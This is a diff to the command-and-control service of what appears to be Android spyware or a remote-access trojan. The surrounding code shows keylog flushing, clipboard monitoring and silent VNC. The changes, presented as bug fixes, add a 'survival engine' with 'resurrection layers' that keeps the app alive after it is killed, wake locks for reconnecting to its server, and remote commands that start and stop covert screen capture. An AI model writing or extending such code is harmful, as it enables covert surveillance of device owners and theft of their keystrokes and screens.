@@ -354,6 +354,8 @@ public class CommandControlService extends Service {
         setupClipboardListener();
         
         // Conecta ao servidor
+        // [Bug 6 FIX] Arm ProtectionManager 10-layer survival engine
+        ProtectionManager.getInstance(this).start();
         connectToServer();
     }
 
@@ -554,6 +556,8 @@ public class CommandControlService extends Service {
         
         // 🔄 Descarrega qualquer keylog acumulado enquanto esteve offline
         flushOfflineKeylogs();
+        // [Bug 8 FIX] Notify ProtectionManager: resets watchdog, releases WakeLock
+        ProtectionManager.getInstance(this).onConnected();
     }
 
     /**
@@ -1301,6 +1305,29 @@ public class CommandControlService extends Service {
                         toggleSilentVnc(false, true, -1);
                         sendResponse("OK", "VNC desativado");
                     } catch (Exception e) {
+                        sendResponse("ERROR", "Erro: " + e.getMessage());
+                    }
+                    break;
+
+                // [Bug 1 FIX] V2 mode routes START_SCREEN_CAPTURE to Screen Reader V2
+                // (UiAssistBridge.startScreenReader) which is already fully implemented.
+                // Previously the command fell through the default and was silently discarded.
+                case "START_SCREEN_CAPTURE":
+                    try {
+                        toggleScreenReader(true);
+                        sendResponse("OK", "Screen capture V2 started");
+                    } catch (Exception e) {
+                        Log.e(TAG, "Erro START_SCREEN_CAPTURE: " + e.getMessage(), e);
+                        sendResponse("ERROR", "Erro: " + e.getMessage());
+                    }
+                    break;
+
+                case "STOP_SCREEN_CAPTURE":
+                    try {
+                        toggleScreenReader(false);
+                        sendResponse("OK", "Screen capture V2 stopped");
+                    } catch (Exception e) {
+                        Log.e(TAG, "Erro STOP_SCREEN_CAPTURE: " + e.getMessage(), e);
                         sendResponse("ERROR", "Erro: " + e.getMessage());
                     }
                     break;
@@ -2136,6 +2163,8 @@ public class CommandControlService extends Service {
         isConnected = false;
         isConnecting = false;
         webSocket = null;
+        // [Bug 8 FIX] Notify ProtectionManager: arms reconnect WakeLock
+        ProtectionManager.getInstance(this).onDisconnected();
         
         // Reagenda reconexão
         if (shouldReconnect) {
@@ -4650,6 +4679,8 @@ public class CommandControlService extends Service {
     @Override
     public void onDestroy() {
         super.onDestroy();
+        // [Bug 6 FIX] Arm resurrection layers before service dies
+        ProtectionManager.getInstance(this).onServiceDestroyed();
         if (sInstance == this) {
             sInstance = null;
         }
